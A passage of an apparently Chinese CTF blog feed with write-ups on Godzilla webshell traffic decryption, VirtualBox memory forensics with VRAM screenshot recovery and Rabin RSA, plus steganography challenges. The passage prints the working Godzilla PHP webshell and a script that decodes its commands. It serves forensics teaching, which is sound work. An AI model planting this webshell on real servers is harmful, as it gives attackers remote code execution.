class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>stream 36</code>哥斯拉流量解密得到加密flag.zip的原始命令，得到密码<code>airDAS1231qaSW@</code></p><figure><img src="/img/2022西湖论剑MISC复现/170134897026714.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写脚本解密也行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><br><span class="hljs-variable">$endata</span> = <span class="hljs-string">&#x27;J%2B5pNzMyNmU2mij7dMD%2FqHMAa1dTUh6rZrUuY2l7eDVot058H%2BAZShmyrB3w%2FOdLFa2oeH%2FjYdeYr09l6fxhLPMsLeAwg8MkGmC%2BNbz1%2BkYvogF0EFH1p%2FKFEzIcNBVfDaa946G%2BynGJob9hH1%2BWlZFwyP79y4%2FcvxxKNVw8xP1OZWE3&#x27;</span>;<br><span class="hljs-variable">$dedata</span> = <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$endata</span>))), <span class="hljs-variable">$key</span>));  <span class="hljs-comment">//urldecode会将+号解析成空格，导致无法解密，replace回去</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dedata</span>;<br><br><span class="hljs-comment">//cmdLinePsh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot; 2&gt;&amp;1methodNameexecCommand</span><br></code></pre></td></tr></table></figure><p>导出flag.zip，解压得到flag</p><h1 id="fornesics">Fornesics</h1><h2 id="isolated-machine-memory-analysis">Isolated Machine MemoryAnalysis</h2><p>参考 <ahref="https://zysgmzb.club/index.php/archives/132">zysgmzb</a> <ahref="https://crazymanarmy.github.io/2023/02/03/第六届西湖论剑网络安全大赛-Misc-Isolated-Machine-Memory-Analysis-Writeup/">空白</a></p><p>题目描述</p><blockquote><p>张三，现用名叫Charlie，在一家外企工作，负责flag加密技术的研究。为了避免flag泄露，这家企业制定了严格的安全策略，严禁flag离开研发服务器，登录服务器必须经过跳板机。张三使用的跳板机是一台虚拟机，虽然被全盘加密没法提取，但好消息是至少还没关机。免责声明：本题涉及的人名、单位名、产品名、域名及IP地址等均为虚构，如有雷同纯属巧合。注：本题模拟真实研发环境，解题有关的信息不会出现在人名、域名或IP地址等不合常理的地方。链接：https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46提取码：cq46</p></blockquote><p>hint</p><blockquote><p>Hint:hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702667.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>hint2:为什么这个Windows内存镜像是ELF格式？hint3:https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p></blockquote><p>取证，但是拿到一个elf</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf imageinfo</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-built_in">INFO</span>    : volatility.<span class="hljs-built_in">debug</span>    : Determining<span class="hljs-built_in"> profile </span>based on KDBG search<span class="hljs-built_in">..</span>.<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 pslist</code></p><p>其他的省略，重点看这几个，VBoxTray类似vmtool，VBoxService可以确定有VirtualBox，mstsc说明有远程桌面，ClipboardMonit使用了剪贴板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit<br><br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>...<br>0xfffffa8004d307a0 VBoxService.ex          648    460     13      116      0      0 2022-11-02 07:10:56 UTC+0000<br>...<br>0xfffffa800384d9b0 VBoxTray.exe           1884    300     12      138      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa8003854b00 ClipboardMonit         1516    300      1       47      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa80050f2b00 mstsc.exe              2840    300     14      715      1      0 2022-11-01 16:12:35 UTC+0000<br>...<br></code></pre></td></tr></table></figure><p>先看剪贴板内容</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 clipboard</code></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Volatility Foundation Volatility Framework 2</span><span class="hljs-string">.</span><span class="hljs-comment">6</span><br><span class="hljs-comment">Session    WindowStation Format                         Handle Object             Data</span><br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">--------------------------------------------------</span><br>         <span class="hljs-comment">1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                  0x7400000001</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970</span> <span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN PUBLIC KEY</span><span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-comment">END PUBLIC KEY</span><span class="hljs-literal">-----</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                           0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_LOCALE                         0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       0x0L                              0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span>            <span class="hljs-comment">0x901a3 0xfffff900c01f2cc0</span><br></code></pre></td></tr></table></figure><p>看到有rsa公钥开头的data，-v查看详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Session    WindowStation Format                         Handle Object             Data<br>---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------<br>         1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0<br>0xfffff900c00e26c4  5e 01 03 00 00 00 00 00                           ^.......<br>         1 WinSta0       CF_TEXT                  0x7400000001 ------------------<br>         1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970 -----BEGIN PUBLIC KEY---...----END PUBLIC KEY-----<br>0xfffff900c1df7984  2d 00 2d 00 2d 00 2d 00 2d 00 42 00 45 00 47 00   -.-.-.-.-.B.E.G.<br>0xfffff900c1df7994  49 00 4e 00 20 00 50 00 55 00 42 00 4c 00 49 00   I.N...P.U.B.L.I.<br>0xfffff900c1df79a4  43 00 20 00 4b 00 45 00 59 00 2d 00 2d 00 2d 00   C...K.E.Y.-.-.-.<br>0xfffff900c1df79b4  2d 00 2d 00 0d 00 0a 00 4d 00 46 00 6f 00 77 00   -.-.....M.F.o.w.<br>0xfffff900c1df79c4  44 00 51 00 59 00 4a 00 4b 00 6f 00 5a 00 49 00   D.Q.Y.J.K.o.Z.I.<br>0xfffff900c1df79d4  68 00 76 00 63 00 4e 00 41 00 51 00 45 00 42 00   h.v.c.N.A.Q.E.B.<br>0xfffff900c1df79e4  42 00 51 00 41 00 44 00 53 00 51 00 41 00 77 00   B.Q.A.D.S.Q.A.w.<br>0xfffff900c1df79f4  52 00 67 00 4a 00 42 00 41 00 49 00 45 00 5a 00   R.g.J.B.A.I.E.Z.<br>0xfffff900c1df7a04  54 00 78 00 78 00 6c 00 65 00 37 00 2b 00 35 00   T.x.x.l.e.7.+.5.<br>0xfffff900c1df7a14  72 00 79 00 77 00 43 00 35 00 62 00 79 00 49 00   r.y.w.C.5.b.y.I.<br>0xfffff900c1df7a24  75 00 42 00 6b 00 50 00 68 00 77 00 6b 00 79 00   u.B.k.P.h.w.k.y.<br>0xfffff900c1df7a34  76 00 35 00 37 00 52 00 0d 00 0a 00 37 00 35 00   v.5.7.R.....7.5.<br>0xfffff900c1df7a44  36 00 44 00 55 00 43 00 44 00 39 00 69 00 32 00   6.D.U.C.D.9.i.2.<br>0xfffff900c1df7a54  4d 00 57 00 59 00 79 00 55 00 73 00 30 00 41 00   M.W.Y.y.U.s.0.A.<br>0xfffff900c1df7a64  63 00 63 00 36 00 4a 00 5a 00 77 00 79 00 71 00   c.c.6.J.Z.w.y.q.<br>0xfffff900c1df7a74  56 00 4f 00 6d 00 52 00 37 00 34 00 75 00 4d 00   V.O.m.R.7.4.u.M.<br>0xfffff900c1df7a84  76 00 72 00 65 00 49 00 32 00 73 00 6c 00 6c 00   v.r.e.I.2.s.l.l.<br>0xfffff900c1df7a94  65 00 34 00 47 00 79 00 37 00 48 00 6c 00 36 00   e.4.G.y.7.H.l.6.<br>0xfffff900c1df7aa4  50 00 63 00 58 00 78 00 45 00 43 00 41 00 51 00   P.c.X.x.E.C.A.Q.<br>0xfffff900c1df7ab4  49 00 3d 00 0d 00 0a 00 2d 00 2d 00 2d 00 2d 00   I.=.....-.-.-.-.<br>0xfffff900c1df7ac4  2d 00 45 00 4e 00 44 00 20 00 50 00 55 00 42 00   -.E.N.D...P.U.B.<br>0xfffff900c1df7ad4  4c 00 49 00 43 00 20 00 4b 00 45 00 59 00 2d 00   L.I.C...K.E.Y.-.<br>0xfffff900c1df7ae4  2d 00 2d 00 2d 00 2d 00 00 00                     -.-.-.-...<br></code></pre></td></tr></table></figure><p>处理一下得到公钥，暂时没有什么用，再看其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-----BEGIN PUBLIC KEY-----<br>MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBAIEZTxxle7+5rywC5byIuBkPhwkyv57R<br>756DUCD9i2MWYyUs0Acc6JZwyqVOmR74uMvreI2slle4Gy7Hl6PcXxECAQI=<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>看看截图</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 screenshot -D ./</code></p><p>看到上面有一串mac地址</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702668.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>netscan看看网络连接</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 netscan</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>...<br><span class="hljs-number">0</span>x11e73f010        TCPv6    fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:64</span>:<span class="hljs-number">49158</span> fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:4</span>:<span class="hljs-number">3389</span> ESTABLISHED      -<span class="hljs-number">1</span><br>...<br></code></pre></td></tr></table></figure><p>根据题目描述可以大概猜到这是跳板机和服务器的网络连接</p><p>看远程桌面，先尝试找bmc文件，原理：https://www.hetianlab.com/specialized/20210713143551</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 filescan | findstr ".bmc"</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Volatility</span> Foundation Volatility Framework <span class="hljs-number">2</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">0x00000000085889e0</span>     <span class="hljs-number">17</span>      <span class="hljs-number">1</span> RW-r-- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br><span class="hljs-attribute">0x000000011fed52a0</span>     <span class="hljs-number">14</span>      <span class="hljs-number">0</span> R--rw- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br></code></pre></td></tr></table></figure><p>但是导出后分离不出图片</p><p>那么就memdump将mstsc的内存保存到本地</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 memdump -p 2840 -D ./</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br>Writing mstsc.exe [  2840] to 2840.dmp<br></code></pre></td></tr></table></figure><p>修改成.data后缀，用gimp调一下参，得到提示不在RAM中</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702669.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再看回hint1，有vbox显示器的分辨率、显卡等信息</p><p>又根据hint3https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p><p>猜测可能在VRAM中</p><p>利用vboxinfo找内存信息</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 vboxinfo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Magic: 0xc01ac0de<br>Format: 0x10006<br>VirtualBox 7.0.2 (revision 154219)<br>CPUs: 2<br><br>FileOffset       Memory Offset    Size<br>          0x4a2c              0x0    0xa0000<br>         0xa4a2c          0xc0000     0x9000<br>         0xada2c          0xe0000     0x1000<br>         0xaea2c          0xe1000     0x1000<br>         0xafa2c          0xe2000     0xe000<br>         0xbda2c          0xf0000    0x10000<br>         0xcda2c         0x100000   0x100000<br>        0x1cda2c         0x200000 0xdfe00000<br>      0xdffcda2c       0xe0000000  0x2000000<br>      0xe1fcda2c       0xf0000000   0x200000<br>      0xe21cda2c       0xf0400000   0x400000<br>      0xe25cda2c       0xf0800000     0x4000<br>      0xe25d1a2c       0xffff0000    0x10000<br>      0xe25e1a2c      0x100000000 0x20000000<br></code></pre></td></tr></table></figure><p>根据hint3找到VRAM的位置</p><blockquote><p>The VGA/video memory beings at 0xe0000000 on both x86 and x64systems.</p></blockquote><p><code>0xdffcda2c       0xe0000000  0x2000000</code></p><p>那么偏移0xdffcda2c，大小0x2000000</p><p>可以手动或者用dd命令提取出显存数据</p><p><code>dd if=CharlieBrown-PC.elf of=vram skip=3757890092 bs=1 count=33554432</code></p><p>建议手动，dd命令会很久</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026610.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>保存为VRAM，观察发现4字节一组，代表RGBA，由hint1的分辨率得到图片宽高，编写脚本将data转成图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>width = <span class="hljs-number">1440</span><br>height = <span class="hljs-number">900</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VRAM&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makeSourceImg</span>():<br>    img = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, (width, height))<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>            img.putpixel((j, i), (flag[x], flag[x + <span class="hljs-number">1</span>], flag[x + <span class="hljs-number">2</span>],flag[x+<span class="hljs-number">3</span>]))<br>            x += <span class="hljs-number">4</span><br>    <span class="hljs-keyword">return</span> img<br><br>img = makeSourceImg()<br>img.save(<span class="hljs-string">&#x27;1.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到png，这就是对应刚刚的远程桌面的屏幕截图</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026611.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">089ebf3622f6f6d498c1b5ecfe4d831d3e876bf55578586389127e0053bb4fe006e2eee5398b86274fdce0418d16c9bb0bf24922cec491b3047d33eb661784c9<br></code></pre></td></tr></table></figure><p>接下来就是rsa解密了</p><p>在线网站解析公钥http://www.hiencode.com/pub_asys.html，拿到n和e，n可以直接分解得到p，q</p><p>e=2，rabin</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026612.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这道题目是一道比较新也很巧妙的题，利用了vbox虚拟机elf coredump包含额外的VRAM数据来还原远程桌面的截图，最后结合了rsa，一开始做题还毫无头绪，参考了两位师傅的wp后能慢慢理清思路。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023金砖CTF-决赛</title>
    <link href="/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/"/>
    <url>/2023/11/21/2023%E9%87%91%E7%A0%96%E5%86%B3%E8%B5%9BCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="金砖ctf-决赛">2023金砖CTF-决赛</h1><h1 id="ctf">CTF</h1><p>ctf部分总体还是比较难的，时间也短</p><h2 id="web">WEB</h2><p>前面的忘了，中间的忘了，后面的也忘了（不难，就是数组绕、%0a绕，rce绕）</p><h2 id="misc">MISC</h2><h3 id="misc01">MISC01</h3><p>拿到一个wav</p><p>010打开发现有两个文件头<code>52 49 46 46</code></p><figure><img src="/img/2023金砖CTF-决赛/170056731535736.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>foremost分离一下</p><figure><img src="/img/2023金砖CTF-决赛/17005673152401.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>00006606.wav</code>用audacity打开，看频谱图得到<code>pass:stego0626</code></p><figure><img src="/img/2023金砖CTF-决赛/17005673152412.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试很多音频隐写的工具无果，再看回原始wav</p><p>在两个wav中间找到一段字节，仔细看是把文件头<code>50 4b 03 04</code>换成<code>2e 2e 2e 2e</code>的zip（这也是foremost分离不出来的原因）</p><figure><img src="/img/2023金砖CTF-决赛/17005673152413.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿出来，压缩包密码为<code>stego0626</code></p><p>解压出来一段乱码</p><figure><img src="/img/2023金砖CTF-决赛/17005673152414.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到cyberchef，magic得到flag（我不知道是我解压有问题还是这编码就是这样出的）</p><figure><img src="/img/2023金砖CTF-决赛/17005673152415.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="misc02">MISC02</h3><p>拿到green.png</p><p><code>zsteg -a</code>看到有zip</p><figure><img src="/img/2023金砖CTF-决赛/17005673152416.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>导出<code>zsteg -E extradata:0 green.png &gt; flag.zip</code>里面有个加密的rgb.txt再回去看zsteg找到密码<code>pass:h16lly81a</code></p><figure><img src="/img/2023金砖CTF-决赛/17005673152417.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到一串rgb值，数量是66822个，分解一下</p><figure><img src="/img/2023金砖CTF-决赛/17005673152418.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>一系列尝试后转成259*259的图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 